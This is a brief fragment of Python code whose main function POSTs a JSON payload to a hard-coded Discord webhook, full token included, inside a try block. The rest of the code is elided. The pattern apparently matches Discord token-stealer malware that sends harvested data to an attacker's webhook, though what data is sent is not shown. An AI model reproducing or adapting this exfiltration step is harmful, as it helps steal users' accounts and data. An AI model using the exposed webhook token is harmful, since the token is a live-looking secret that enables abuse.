...
def main():
    ...
    try:
        urlopen(Request("https://discord.com/api/webhooks/1366831915667034193/-3oq8uk_Ff6wfF1XKvaZT5c4Vr8KysdtI34mUPBRFb9SIZgJNaCy9WRWyLeRUmXL5GTo", data=dumps(webhook).encode(), headers=getheaders()))   
